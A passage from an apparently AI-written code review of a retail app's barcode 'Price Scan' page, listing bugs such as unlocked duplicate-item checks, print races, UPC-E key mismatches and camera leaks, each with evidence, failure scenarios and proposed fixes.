**Failure scenario.** A manager changes the one category that moved and presses Save without noticing the other six were carried over rather than checked. The chain's shelf data then shows a floor frozen at whatever was entered weeks ago.

**Proposed fix.** When `now == null && prev != null`, add a class `sc-carried` to the input (inkDim text, dashed border) and put a caption above the rows: 'Grey numbers are last week's — change any that moved; Save confirms the rest.' Remove the class on `input` and restyle it as 'changed' (amber wash, §4.8).

</details>

<a id="merch-price-scan"></a>
### Price Scan

I read all of Price Scan: the markup and CSS, the JS in both ranges, and the 16 worker handlers and sticker helpers. The page is carefully built. Every untrusted string I traced into innerHTML goes through psEsc. There are no native dialogs. psStickerCheck has a sequence guard. The worker validates templates, quantities and POs at the boundary. Leaving the page stops the camera. The existing suites pass (price-scan 973, furniture 57).

The biggest risk is still the #265 class of bug, which only the client guards against today. First, the "first store goes alone" check is skipped whenever that first request fails or throws: the other five stores still fan out in parallel. I proved this by driving the real modal. Second, the worker's per-store duplicate check is still an unlocked read-then-write, so two people, a Retry, or a mixed-version rollout can still create duplicate Clover items.

Three shelf-label bugs were proven by running the real code:
- psPrint reads psLast after the printer-probe await. A scan that lands in between prints the old item's QR code next to the new item's price, and the history row mixes the two.
- A UPC-E from a keyboard scanner is saved under its 8-digit form, while the camera saves the same product under the 12-digit form.
- A mistyped 8-digit code passes, because 8-digit codes get no checksum check.

UI/UX problems:
- The scan box uses inputmode=numeric. On iPhone that keypad has no letters, so the "type what the item is" path cannot be used (untested on a device).
- The price-point dialog puts focus on its write button, and handheld scanners send Enter after each scan.
- Managers see "Set the ranges" for furniture, which the worker refuses them.
- Picking a buy after a scan leaves the card priced without it, yet the print is recorded against that buy.

Performance: the camera loop decodes every animation frame on a 4K request, which is about 5.6 ms per frame of decode alone on desktop, several times that on a phone. A quick double-tap on Scan can leave a second camera stream running.

| ID | Sev | Size | Category | Finding | Where | Verified |
|---|---|---|---|---|---|---|
| [merch-price-scan-4](#merch-price-scan-4) | high | minor | ui-ux | iPhone numeric keypad on the scan box leaves no way to type a product description | `index.html:4984` | unverified |
| [merch-price-scan-1](#merch-price-scan-1) | high | major | bug | sticker-create-price-point duplicate guard is an unlocked read-then-write per store, so concurrent callers still create duplicate Clover items | `worker.js:24311` | unverified |
| [merch-price-scan-2](#merch-price-scan-2) | medium | minor | bug | Fan-out skips the old-worker check when the first store's request fails or returns no results | `index.html:24119` | unverified |
| [merch-price-scan-3](#merch-price-scan-3) | medium | minor | bug | psPrint reads psLast after the printer probe, so a scan that lands mid-print puts the new price next to the old QR | `index.html:25837` | unverified |
| [merch-price-scan-5](#merch-price-scan-5) | medium | minor | bug | Hardware-scanner Enter re-fires a focused Print, Reprint or Add button, and the next scan's digits are lost | `index.html:25858` | unverified |
| [merch-price-scan-6](#merch-price-scan-6) | medium | minor | bug | Price-point confirm dialog autofocuses its write button, and a double tap opens two dialogs | `index.html:24041` | unverified |
| [merch-price-scan-8](#merch-price-scan-8) | medium | minor | bug | Double-tapping Scan starts two camera streams, and only one is ever stopped | `index.html:26519` | **fixed 2026-09-24** |
| [merch-price-scan-9](#merch-price-scan-9) | medium | minor | bug | Picking or clearing a buy after a scan leaves the card priced without it, yet the print is recorded against the new buy | `index.html:25856` | unverified |
| [merch-price-scan-10](#merch-price-scan-10) | medium | minor | bug | Furniture 'Set the ranges' is shown to managers and executives, but the worker lets only admins save | `index.html:24422` | unverified |
| [merch-price-scan-11](#merch-price-scan-11) | medium | minor | bug | A partial Clover sweep is cached for 24 h as the category map, making whole categories unprintable | `worker.js:13461` | unverified |
| [merch-price-scan-12](#merch-price-scan-12) | medium | minor | performance | Camera loop decodes every animation frame on a 4K stream, and the JS decoder also runs when the native detector exists | `index.html:26659` | unverified |
| [merch-price-scan-13](#merch-price-scan-13) | medium | minor | ui-ux | A scan submitted while a lookup is running is silently dropped, and its digits are then cleared | `index.html:23680` | unverified |
| [merch-price-scan-14](#merch-price-scan-14) | medium | minor | accessibility | Low-margin warning on furniture prices is hard-coded amber with no dark variant (2.61:1) | `index.html:24485` | unverified |
| [merch-price-scan-7](#merch-price-scan-7) | medium | major | bug | UPC-E keys differently by input path, and 8-digit typos pass unchecked | `index.html:23646` | unverified |
| [merch-price-scan-15](#merch-price-scan-15) | medium | major | bug | Choosing a template in the sticker editor's dropdown makes it live chain-wide and discards unsaved edits | `index.html:25627` | unverified |
| [merch-price-scan-16](#merch-price-scan-16) | low | minor | ui-ux | Mode taps are about 16 px tall, and the reprint quantity box is 15 px text, which triggers iOS zoom | `index.html:4839` | unverified |
| [merch-price-scan-17](#merch-price-scan-17) | low | minor | bug | Missing JSON-parse guards turn edge 5xx HTML pages into 'Unexpected token <' with the status lost | `index.html:23676` | unverified |
| [merch-price-scan-18](#merch-price-scan-18) | low | minor | bug | A lookup still running when Manual or Furniture opens renders into the new mode | `index.html:23679` | unverified |
| [merch-price-scan-19](#merch-price-scan-19) | low | minor | accessibility | Missing labels, live region and keyboard access on scan controls | `index.html:4949` | unverified |
| [merch-price-scan-20](#merch-price-scan-20) | low | minor | performance | Camera keeps running while the app is backgrounded, and the 30 s auto-stop cannot fire | `index.html:26627` | **fixed 2026-09-24** |
| [merch-price-scan-21](#merch-price-scan-21) | low | minor | bug | Furniture 'priced before' date uses the UTC calendar day | `index.html:24454` | unverified |

<details><summary>Details: evidence, failure scenario, proposed fix</summary>

<a id="merch-price-scan-4"></a>
#### merch-price-scan-4 — iPhone numeric keypad on the scan box leaves no way to type a product description

*high · minor · ui-ux · confidence medium · `index.html:4984` · unverified*

**Evidence.** index.html:4984-4986: `<input id="ps-input" class="ps-in" type="text" inputmode="numeric" ... placeholder="Barcode, or type the product">`. psScan (23644-23662) treats any non-digit input as `{ description: raw }`, and the worker's own miss message tells people to do exactly that (index.html:24729): 'This barcode is not in any product database … Type what the item is instead and it will price normally.' On iPhone, `inputmode="numeric"` shows the 0-9 number pad, which has no letters, no ABC switch and no dictation key. index.html:23516 notes that iPhones are 4 of the 6 installed devices. The attribute has been there since the page shipped (ac61598); nothing in lessons or todo marks it as deliberate.

**Failure scenario.** A manager on an iPhone scans a Room Essentials desk and gets 'barcode not recognised … Type what the item is instead'. They tap the box and get a digits-only keypad, so they cannot type 'room essentials desk'. The only ways out are Photo, or Manual mode, which skips pricing. The typed-description path the page advertises is effectively unavailable on most devices unless a hardware keyboard is paired.

**Proposed fix.** Drop `inputmode="numeric"` from #ps-input (the default text keyboard still has a 123 key). Keyboard-wedge scanners and the camera are unaffected because neither uses the on-screen keyboard. If numeric-first is wanted, add a small toggle in .ps-row that flips `el('ps-input').inputMode` between 'numeric' and 'text' and refocuses. Verify on a real iPhone that letters can be typed and Enter still submits.

<a id="merch-price-scan-1"></a>
#### merch-price-scan-1 — sticker-create-price-point duplicate guard is an unlocked read-then-write per store, so concurrent callers still create duplicate Clover items

*high · major · bug · confidence high · `worker.js:24311` · unverified*

**Evidence.** worker.js:24311-24324: `const results = await Promise.all(targets.map(async (s) => { ... const dup = await cloverCodeInUse(env, s, code, headers, ...); ... if (dup.inUse) return { store: s, ok: true, existed: true ... }; ... const itemResp = await cloverFetch(`.../items`, { method: "POST", ... })`. Nothing claims (store, code) between the read and the POST. cloverCodeInUse (worker.js:1415) pages about 1,100 items per store (two Clover pages), so the gap between read and write is seconds long. The client serialises only its own requests: index.html:24116-24130 sends the first store alone, then `Promise.all(rest.map(...))`. lessons.md (2026-09-21) rule 1 says: "A read-then-write duplicate check does not [hold if two callers are inside it at once]". The fix for #265 went into the client only.

**Failure scenario.** (a) Managers at BL1 and BL4 scan the same new opportunity-buy item a few seconds apart. Both see "No Clover item with code BL-50002-1_5" and both press Add. A's BL2 request and B's BL2 request overlap: each reads Clover, sees nothing, and POSTs, giving two items with one code at BL2 (and possibly at every other store). (b) One user on warehouse wifi: psPpSend's fetch throws for BL8, the row goes red, and they press "Retry 1 store" while the first request may still be running on the worker, giving two items at BL8. (c) During a gradual worker rollout (CLAUDE.md rule 5, ~180 s of mixed versions) or a rollback, the first-alone proof covers only the instance that answered it. A parallel request landing on an instance that ignores `stores` recreates the #265 incident.

**Plan.** FUTURE PLAN.
1. Migration (additive, inert for the current worker): `CREATE TABLE price_point_claims (store TEXT NOT NULL, code TEXT NOT NULL, claimed_by TEXT, claimed_at TEXT NOT NULL, item_id TEXT, PRIMARY KEY (store, code));`. Apply to staging and then prod D1 with explicit confirmation (MEMORY rule 7).
2. Worker: inside the per-store map, BEFORE cloverCodeInUse, take an atomic claim: `INSERT INTO price_point_claims (store, code, claimed_by, claimed_at) VALUES (?,?,?,?) ON CONFLICT(store, code) DO UPDATE SET claimed_by=excluded.claimed_by, claimed_at=excluded.claimed_at WHERE price_point_claims.item_id IS NULL AND price_point_claims.claimed_at < ? RETURNING store`, with a 2-minute staleness cutoff. D1 serialises writes, so exactly one caller wins. A loser answers `{ store, ok:false, stage:'in-progress', error:'Being created by another request right now — retry in a moment' }`, or `{ ok:true, existed:true }` if item_id is already set. On success, `UPDATE ... SET item_id=?`. On failure before the POST, DELETE the claim.
3. Deploy order: migration first (the old worker ignores the table), then the worker. No frontend change is needed: psPpMark already renders a per-store `error` on the row and offers Retry.
4. Risks: a stale claim if the invocation is cancelled mid-create (covered by the expiry); a crash between the POST and the UPDATE leaves item_id null, but the next caller's cloverCodeInUse still finds the item and answers existed.
5. Verify: extend test-price-scan's scripted-worker harness (around line 4336) to drive the real handler with two concurrent confirm calls for the same store against a Clover stub with latency. Assert exactly one POST /items. Run it against the current handler first and watch it fail (2 POSTs).

<a id="merch-price-scan-2"></a>
#### merch-price-scan-2 — Fan-out skips the old-worker check when the first store's request fails or returns no results

*medium · minor · bug · confidence high · `index.html:24119` · unverified*

**Evidence.** index.html:24117-24131: `const firstResults = await psPpSend(first); if (firstResults && firstResults.length > 1) { legacy = true; ... } else { if (firstResults) psPpMark(firstResults[0]); if (rest.length) { await Promise.all(rest.map(async (s) => { ... })) } }`. psPpSend returns null on a non-ok reply or a thrown fetch (24066-24073). It returns `[]` on a 200 with no `results`, which is what the worker sends for `created:false, reason:'clover unreachable'|'no category code'` at worker.js:24187 and 24198. In both cases the else-branch fans out, even though nothing proved the worker honours `stores`. The comment at 24085 says "THE FIRST STORE GOES ALONE, AND THAT SEQUENCING IS THE ENTIRE GUARD". I proved this with scratchpad/merch-price-scan/fanout.mjs, which drives the real function: with the 1st reply HTTP 500 → 6 confirm requests sent; with the 1st fetch throwing → 6 confirm requests sent. Separately, with `[]`, psPpMark(undefined) returns early, so that row stays on "adding…" and the worker's `detail` is never shown.

**Failure scenario.** An old or rolled-back worker is live (the exact #265 condition). Its create for the first store is slow or hits a Clover 429 and answers 500, or the warehouse wifi drops that one fetch. The client then fires the other five concurrently. Each old-worker request creates at all six stores through the unlocked check, which is the five-copies incident again. On a current worker, a 200 {created:false, detail:'Clover did not answer…'} leaves every row saying "adding…" forever, with no reason shown.

**Proposed fix.** In psPpSend, after `if (!r.ok) {...}`, add: `if (!Array.isArray(b.results) || !b.results.length) { psPpSet(overlay, s, 'bad', String(b.detail || b.error || 'no result').slice(0, 60)); return null; }`.
In runStores, replace the else-branch guard with: `if (!firstResults) { rest.forEach(s => psPpSet(overlay, s, 'wait', 'not sent')); } else if (firstResults.length > 1) { /* legacy */ } else { psPpMark(firstResults[0]); /* parallel rest */ }`.
Retry then goes through runStores(failed), which sends one store alone again. Add a case to the test-price-scan modal harness where the first confirm returns 500 and later ones return six results: assert writes.length === 1.

<a id="merch-price-scan-3"></a>
#### merch-price-scan-3 — psPrint reads psLast after the printer probe, so a scan that lands mid-print puts the new price next to the old QR

*medium · minor · bug · confidence high · `index.html:25837` · unverified*

**Evidence.** index.html:25788 captures `const a = psSticker;` but not the item. After `probe = await psZebraDevice();` (25802; up to 2×5 s timeouts plus 800 ms retry), line 25837 builds `psZpl(a.code, psLast.price, { retail: psLast.retail, ... })`, and 25856 records `psRecordPrint(a, psLast, qty, psObActive())`. psScan stays usable during a print (psBusy is scan-only; only the Print button is disabled). I proved it with scratchpad/merch-price-scan/print-race.mjs, which runs the real psZpl and psPrint and changes psLast during the probe: `QR carries: BL-50002-1_5 | printed price text: $34.50`, and the history row is `{"code":"BL-50002-1_5","price":34.5,"title":"Room Essentials desk"}`.

**Failure scenario.** The Browser Print agent is cold, or the first /available is empty (the documented 800 ms retry). The associate presses Print for a $1.50 beverage, then scans the next item (a cached lookup answers in about 300 ms). The label prints with the beverage's QR (rings $1.50) but shows $34.50 in large type. The reprint history row pairs the beverage's code with the desk's title and price, so a later Reprint re-asks sticker-check for the desk.

**Proposed fix.** In psPrint, capture the item with the sticker before any await: `const a = psSticker, item = psLast; if (!a?.printable || !item) return;`. Then use `item.price`, `item.retail` and `psRecordPrint(a, item, qty, a.po)` (see finding 9 for why `a.po` is used). This is about 4 changed lines.

<a id="merch-price-scan-5"></a>
#### merch-price-scan-5 — Hardware-scanner Enter re-fires a focused Print, Reprint or Add button, and the next scan's digits are lost

*medium · minor · bug · confidence medium · `index.html:25858` · unverified*

**Evidence.** The page's primary input is a keyboard-wedge scanner that types digits and then Enter (comment at index.html:23512-23516). psScan returns focus to #ps-input after a scan (23683), but psPrint only does `finally { if (btn) btn.disabled = false; }` (25857-25859). Focus stays on #ps-print, which Chrome on Android and desktop focuses on click. psReprint (26145-26147) and the price-point dialog Close work the same way. Enter on a focused <button> fires click.

**Failure scenario.** Receiving bench with a USB or Bluetooth scanner on Chrome: scan item A, click Print, one label comes out, and Print is re-enabled and still focused. Scan item B: its digits go to the button and are dropped, and the trailing Enter clicks Print, so a second label of item A prints. Item B is never priced, and the associate may stick A's extra label on B. The same thing happens with Reprint in the Reprint tab.

**Proposed fix.** After a print, reprint, or closing the price-point dialog, hand focus back to the scan box, as psScan already does: in psPrint's finally add `setTimeout(() => { try { el('ps-input').focus(); } catch (e) {} }, 0);`, and add the same to psReprint's finally and to `close()` in psCreatePricePoint. About 3 lines. Optionally ignore an Enter keydown on #ps-print that arrives within ~50 ms of other keystrokes, since wedge scanners type faster than people.

<a id="merch-price-scan-6"></a>
#### merch-price-scan-6 — Price-point confirm dialog autofocuses its write button, and a double tap opens two dialogs

*medium · minor · bug · confidence high · `index.html:24041` · unverified*

**Evidence.** index.html:24041 `goBtn.focus();`. goBtn is "Add it at every store", or the red "Add it anyway" when warnings about a price off the rung or out of range exist (24030-24032). Those warnings exist to catch typos before Clover writes at six stores (worker.js:24230-24269). A wedge scanner's trailing Enter on the focused button starts runStores. Separately, the re-entry guard `if (PS_PP_STATE.open) return;` (23943) is only set at 24036, after the awaited preview (23965). A second tap on 'Add it to inventory at every store' during the preview round trip starts a second preview and appends a second overlay.

**Failure scenario.** A manager types $75 instead of $7.50 in Manual mode and presses Add it to inventory. The dialog opens with the warning 'prices run $1.00 to $12.00. $75.00 is outside that' and focus on 'Add it anyway'. They scan the next item out of habit, and the Enter creates BL-xxxxx-75 at all six stores without anyone reading the warning. Removing it means deleting at six stores. A double tap leaves a second, identical dialog under the first, which looks like the create did not happen after Close.

**Proposed fix.** Focus `cancelBtn` (or the dialog title with tabindex=-1) instead of goBtn, so only a deliberate click or Tab+Enter writes. Move the re-entry guard ahead of the preview: set `PS_PP_STATE.open = true` right after the `if (PS_PP_STATE.open) return;` check, and reset it on each early `return` in step 1 (or wrap step 1 in try/finally that resets unless the overlay was appended). About 6 lines.

<a id="merch-price-scan-8"></a>
#### merch-price-scan-8 — Double-tapping Scan starts two camera streams, and only one is ever stopped

*medium · minor · bug · confidence high · `index.html:26519` · unverified · fixed 2026-09-24*

**Evidence.** index.html:26519 `if (psScanning) { psStopScan(); return; }`, but psScanning is only set at 26542, after `stream = await navigator.mediaDevices.getUserMedia(...)` (26537). The button shows 'Scan' and stays clickable the whole time. A second tap starts a second getUserMedia; both resolve, `psStream = stream` overwrites the first, and two `tick` loops run. psStopScan (26765) stops only `psStream`. Also, `await video.play();` (26548) is not in a try: if it rejects, psScanning is true and the stream runs while #ps-scanbox is still hidden and the button still reads 'Scan'. The catch at 26538-26540 shows 'No camera available' for every error, including a denied permission and a busy camera.

**Failure scenario.** On Android Chrome or desktop, where the same camera can be opened twice, a manager taps Scan twice while the camera spins up (~0.5-1 s). A code is read and psStopScan runs, but the first stream is never stopped. The camera indicator stays lit and the battery drains until the app is killed; index.html:24222-24224 calls exactly this 'a battery and a privacy problem'. Both loops also run the decoder, doubling CPU until stop.

**Proposed fix.** Add `let psStarting = false;`. In psBarcode: `if (psScanning) {...} if (psStarting) return; psStarting = true; try { stream = await getUserMedia(...) } catch (e) { uiAlert(e && e.name === 'NotAllowedError' ? 'Camera permission is off for this app — allow it in Settings, or type the number.' : 'No camera available. Type the number, or use the Photo button.'); return; } finally { psStarting = false; }`. Then, if the page was left meanwhile (`el('page-merch-scan').classList.contains('hidden')`), stop the tracks and return. Wrap `await video.play()` in try/catch that calls psStopScan(). In psStopScan add `const v = el('ps-video'); if (v) v.srcObject = null;`. About 15 lines.

<a id="merch-price-scan-9"></a>
#### merch-price-scan-9 — Picking or clearing a buy after a scan leaves the card priced without it, yet the print is recorded against the new buy

*medium · minor · bug · confidence high · `index.html:25856` · unverified*

**Evidence.** psObPick (index.html:25935-25940) and psObClear (25891-25896) only repaint the strip. The card underneath was priced by merch-scan and checked by sticker-check under the OLD context. Meanwhile the strip now says 'Pricing into PO X', which psScan's own comment calls 'the screen claiming a context the answer never had' (23659-23661). psPrint then prints `a.code` / `a.po` from the old check (25837) but records `psRecordPrint(a, psLast, qty, psObActive())` (25856), i.e. the NEW PO. sticker-printed (worker.js:23682-23701) stores any open PO without checking it against `code`.

**Failure scenario.** The associate scans an item (ladder price, ordinary code BL-50008-2_5), then remembers the load and taps Buy → PO 12345. The card still shows the ladder price rather than the manifest's price, and Print outputs the ordinary-code label while sticker_prints records it against PO 12345. The buy's printed count now includes a label that does not scan to the opportunity-buy item. The reverse happens with Stop: an OB-code label is recorded with no PO, so the buy reads short forever (the case psRecordPrint's 409 comment calls unnoticeable).

**Proposed fix.** (1) Record what the label actually carries: `psRecordPrint(a, item, qty, a.po)` (together with the fix in finding 3). (2) In psObPick and psObClear, invalidate a card priced under the other context: `if (psLast) { psLast = null; psSticker = null; el('ps-result').innerHTML = ''; psStatus(psOb.po ? 'Buy selected — scan the item again to price it into this buy.' : 'Buy cleared — scan again for the usual price.'); }`. About 8 lines.

<a id="merch-price-scan-10"></a>
#### merch-price-scan-10 — Furniture 'Set the ranges' is shown to managers and executives, but the worker lets only admins save

*medium · minor · bug · confidence high · `index.html:24422` · unverified*

**Evidence.** index.html:24422 `if (psCanOverride() && fn.cat) { h += `...onclick="fnBands()">Set the ranges</button>` }`. psCanOverride was widened to `canSeeFinancials(currentUser)` (26173-26175: superuser/admin/executive/manager) for merch-scan-save. furniture-bands-save still uses `requireAdminAccess(..., { allowAdminMutation: true })` (worker.js:23092), which resolves to canAccessInventory (superuser/admin only). scripts/test-furniture.mjs:60 pins `furniture-bands-save … 'u-mgr1' → 403`. The fnDraw comment says 'A manager sees the ranges applied; an admin sees them and can change them.' This is the 'One right wearing two jobs' lesson again.

**Failure scenario.** A store manager in Furniture mode taps 'Set the ranges', types low/usual/high for a condition and presses Save. The status line shows 'Could not save: Forbidden' (the worker answers {error:'Forbidden', code:'NEED_ADMIN'}). The screen offered a control the worker refuses, which is what psCanOverride's own comment says 'teaches people the app is broken'.

**Proposed fix.** Add a right named after the job: `function psCanSetBands() { return !!currentUser && ['superuser', 'admin'].includes(currentUser.role); }`. Use it at 24422 instead of psCanOverride(). Add a test-price-scan or test-furniture assertion that runs psCanSetBands for a manager (false) and an admin (true), next to the worker's 403 pin, so the two gates are compared directly.

<a id="merch-price-scan-11"></a>
#### merch-price-scan-11 — A partial Clover sweep is cached for 24 h as the category map, making whole categories unprintable

*medium · minor · bug · confidence medium · `worker.js:13461` · unverified*

**Evidence.** worker.js:13457-13461: `for (let offset = 0; offset < 5000; offset += 1000) { const r = await cloverFetch(...); if (!r?.ok) break; ...`. A non-ok page is treated as the end of the catalogue. The partial tally is then written with a fresh timestamp (13497-13498: `SALES_SNAPSHOTS.put(stickerCodesKey(s), JSON.stringify({ map, field, codes, at: new Date().toISOString() }))`) and trusted for STICKER_CODES_TTL = 86400 s. sticker-check returns 'no category code' (23579-23582) before stickerCodeExists's forced re-read, so nothing refreshes it. If the FIRST page fails, the empty map returns `{ map: {} }` with no cache rather than null, which renders as the refusal 'this category has no sticker number' instead of the endpoint's 'clover unreachable' fault. MEMORY rule 4: Clover degrades by returning LESS.

**Failure scenario.** During the price-point fan-out, six catalogue sweeps run at once and page 2 at BL4 gets a Clover 429. The cached map for BL4 now lacks every category whose BL- items sit past item 1,000. For the next 24 h, scanning such an item at BL4 says 'No Clover item in X carries a BL- code, so this category has no sticker number yet. An admin has to create the first item in it', which sends someone to fix Clover data that is fine.

**Proposed fix.** Worker-only and backward compatible (same response shapes): replace `if (!r?.ok) break;` with `if (!r?.ok) return cached?.map ? { map: cached.map, field: cached.field || 'code', codes: cached.codes || [] } : null;`, the same trade the catch block already makes. The endpoints then give their existing 'clover unreachable' refusal. Add a test-price-scan case where page 2 answers 429 and assert that nothing is written to KV and the previous map is returned.

<a id="merch-price-scan-12"></a>
#### merch-price-scan-12 — Camera loop decodes every animation frame on a 4K stream, and the JS decoder also runs when the native detector exists

*medium · minor · performance · confidence high · `index.html:26659` · unverified*

**Evidence.** index.html:26533 requests 3840×2160. tick (26624-26698) re-schedules with `requestAnimationFrame(tick)` (60 Hz) with no time gate. Each tick does:
- resizes the canvas (`canvas.width = w; canvas.height = 56;` at 26659, which reallocates the backing store every frame);
- drawImage plus getImageData of the band (a CPU readback, since willReadFrequently is set);
- allocates 56 arrays of w (`const row = new Array(w)` at 26670);
- every other frame, 72 columns of bandH (up to 1,728).
Where BarcodeDetector exists, `detector.detect(video)` on the full 4K frame runs AND the JS decoder still runs after it. I measured decodeEanRow alone (scratchpad/merch-price-scan/decode-perf.mjs, desktop node): 3.7 ms per horizontal pass + 3.9 ms per vertical pass ≈ 5.6 ms per tick, before pixel conversion and readback. A phone is several times slower.

**Failure scenario.** On an iPhone or mid-range Android at a receiving bench, the main thread is close to saturated for up to 30 s per scan attempt. The zoom slider and torch button lag, the phone heats, and battery drains across a day of 'fifty of these'. On Android the costly native detect plus the JS decode run together every frame.

**Proposed fix.** Inside tick:
(1) Throttle: `if (performance.now() - lastRun < 70) { requestAnimationFrame(tick); return; }` (~14 fps is plenty for the two-reads-in-a-row rule).
(2) Set `canvas.width`/`vcanvas.height` only when w or bandH changes.
(3) Reuse one `Float32Array(w)` row buffer and one `Float32Array(bandH)` column buffer instead of `new Array` per row. runsFrom only iterates, so typed arrays work.
(4) When `detector` exists, run the JS decoder only every 3rd tick.
About 15 lines. Verify with the existing 2,000-frame fuzz and a Chrome performance trace on a phone.

<a id="merch-price-scan-13"></a>
#### merch-price-scan-13 — A scan submitted while a lookup is running is silently dropped, and its digits are then cleared

*medium · minor · ui-ux · confidence high · `index.html:23680` · unverified*

**Evidence.** index.html:23636 `if (psBusy) return;` silently ignores Enter while a lookup runs; only #ps-go is disabled and #ps-input stays editable. On success, line 23680 `el('ps-input').value = '';` clears the box unconditionally, including anything typed or scanned after `raw` was read. accept() in the camera loop (26617-26620) also calls psScan after stopping the camera, so a camera read during a lookup is lost the same way. A cold lookup takes ~11 s (comment at 23569-23572).

**Failure scenario.** On a receiving bench, item A is a cold lookup (~11 s). The associate scans item B with the wedge scanner during it. B's digits land in the box, its Enter is ignored, and when A's answer arrives the box is wiped. B was never priced and nothing on screen says so, so B goes to the shelf unpriced or with A's label.

**Proposed fix.** In psScan:
(a) Busy branch: `if (psBusy) { psQueued = true; psStatus('Still pricing the last item — this one runs next.'); return; }`.
(b) Success path: clear the box only if unchanged, `if (el('ps-input').value.trim() === raw) el('ps-input').value = '';`.
(c) In finally, after `psBusy = false`: `if (psQueued) { psQueued = false; if (el('ps-input').value.trim()) psScan(); }`.
About 8 lines.

<a id="merch-price-scan-14"></a>
#### merch-price-scan-14 — Low-margin warning on furniture prices is hard-coded amber with no dark variant (2.61:1)

*medium · minor · accessibility · confidence high · `index.html:24485` · unverified*

**Evidence.** index.html:24484-24485 inline style: `g < 30 ? ';color:#8a4b00' : ''` on the 9.5px '<n>% GP' line inside .fn-prices buttons. There is no .dark override, and DESIGN.md §2.1 says dark is the primary theme. Computed contrast (scratchpad/merch-price-scan/contrast.mjs): 2.61:1 on the dark panel #101826, 1.98:1 on a selected (.on) button (#22c55e @16% over #101826), 2.91:1 on OLED #0a0a0a; light is 6.80:1. Also at 4719, `.ps-tab .n{opacity:.72}` (the Reprint count) computes 3.12:1 (light off), 2.81:1 (light on) and 3.38:1 (dark off).

**Failure scenario.** In dark mode, a manager picks the 'low' price for a sofa. The only on-button signal that it misses the 30% floor ('24% GP') is dark amber on navy at 2:1, which is effectively invisible on the selected button. The Reprint tab's count is also under 4.5:1 in both themes.

**Proposed fix.** Replace the inline colour with a class: `.fn-gp-low{color:#8a4b00}` and `.dark .fn-gp-low{color:#f0a742}`, and emit `class="t fn-gp-low"`. Computed: 6.80 light, 8.73 on the dark panel, 6.61 on the selected dark button, 9.72 on OLED. #f0a742 is already this page's dark amber (.ps-chip.warn). Drop `opacity:.72` from `.ps-tab .n` (full colour computes 5.62 / 5.21 / 4.55).

<a id="merch-price-scan-7"></a>
#### merch-price-scan-7 — UPC-E keys differently by input path, and 8-digit typos pass unchecked

*medium · major · bug · confidence high · `index.html:23646` · unverified*

**Evidence.** The camera path expands UPC-E: psNormalizeCode(raw,'upc_e') (index.html:26500-26504) returns the 12-digit UPC-A, and the comment at 26481-26484 says keys must not differ by which path scanned the item ('item_cache is keyed on that string'). The wedge/typed path sends 8 digits as-is: psScan accepts `[8,12,13,14].includes(digits.length)` with gtinCheckOk returning true for length 8 (23528), and the worker's merchCanonicalUpc (worker.js:10639-10644) only trims leading zeros from 13/14-digit codes. Proof (scratchpad/merch-price-scan/upce.mjs): camera → `042100005264`; wedge → accepted, worker key `04252614`; the typo `04252615` is also accepted even though its UPC-E check digit fails.

**Failure scenario.** A soap bar with a UPC-E is priced on a phone camera (key 042100005264) and overridden by an admin. The receiving bench scans it with a wedge scanner, which by default transmits 8 digits (04252614). That is a cache miss, so it pays for a fresh ~11 s lookup, ignores the override, and writes a second item_cache row. The two rows then drift apart on Products. A one-digit 8-digit typo is filed as a real barcode, which is the RID-X failure the checksum was added to stop.

**Plan.** FUTURE PLAN.
1. Worker (deploy first):
   - merchCanonicalUpc expands an 8-digit code starting with 0/1 whose expanded UPC-A check digit verifies into that UPC-A. This needs a server copy of upcaFromUpce, pinned by test to index.html's.
   - merchIdForms also yields the raw 8-digit spelling, so rows cached under the old key are still read.
   - isPlausibleBarcode for 8 digits accepts a valid UPC-E (expanded check) or a valid EAN-8 (plain GTIN check), and nothing else.
   - Manifest matching: the obSheet query compares against ob_upc, so match both spellings (`ob_upc IN (?, ?)`) rather than backfilling. A backfill would be a D1 mutation needing explicit confirmation.
2. Frontend (either order afterwards; safe alone because it only refuses earlier): mirror the tightened 8-digit check in psScan and pmPrice, and optionally expand in the box so what is shown is the canonical key.
3. Why worker first: the canonical key changes, and only the worker can keep reading legacy 8-digit rows.
4. Verify: unit tests merchCanonicalUpc('04252614') === '042100005264', merchIdForms includes '04252614', isPlausibleBarcode('04252615') === false. A test-price-scan D1 case where an item cached under one spelling is found by a scan of the other.

<a id="merch-price-scan-15"></a>
#### merch-price-scan-15 — Choosing a template in the sticker editor's dropdown makes it live chain-wide and discards unsaved edits

*medium · major · bug · confidence high · `index.html:25627` · unverified*

**Evidence.** index.html:25627-25648: `window.stPick = (id) => { ... fetch(sticker-template) ... return fetch(`${WORKER_BASE}?action=sticker-template-set`, { method: 'POST', body: JSON.stringify({ op: 'activate', id }) }) ... stStatus(`Now using ${t.name}.`) }`. It is wired to `<select onchange="stPick(this.value)">` (25412). The GET fetch's `full` is computed and never used. The comment explains why: 'The list endpoint returns names only; the fields come from the save response or the active template'. The sticker-template GET (worker.js:23390-23398) returns only `templates: [{id,name,updatedAt,updatedBy}]` plus the active one, so the only way to load another template's fields is to activate it. As a result the 'Use this one' button (25420) can never appear for a picked template, and any edits in the current stTpl are replaced without a prompt.

**Failure scenario.** A superuser wants to look at the 'Big price' draft before deciding. Selecting it in the dropdown switches every store's shelf labels to that draft at once. If they had half-edited the current template, those edits are gone. The status line 'Now using Big price' is the only sign.

**Plan.** FUTURE PLAN.
1. Worker (additive, deploy first): include `items: coll.items` (fields included; at most 10 small objects) in the sticker-template GET. Old clients ignore it.
2. Frontend: stPick switches locally when the GET carried `items` (`stTpl = clone(items.find(t => t.id === id))`) and sends no POST. If the field is absent (worker not yet deployed), fall back to today's path, so either deploy order stays correct. Before switching, if stTpl differs from its saved copy, `await uiConfirm('Discard the unsaved changes to …?')`. Activation then happens only through 'Use this one' (stActivate).
3. Deploy order: the worker first, because the frontend's new path depends on the new field and has a fallback for when it is missing.
4. Verify: a test-price-scan case that drives stPick with a scripted worker returning items and asserts zero sticker-template-set POSTs, and one that omits items and asserts the legacy activate path still works.

<a id="merch-price-scan-16"></a>
#### merch-price-scan-16 — Mode taps are about 16 px tall, and the reprint quantity box is 15 px text, which triggers iOS zoom

*low · minor · ui-ux · confidence high · `index.html:4839` · unverified*

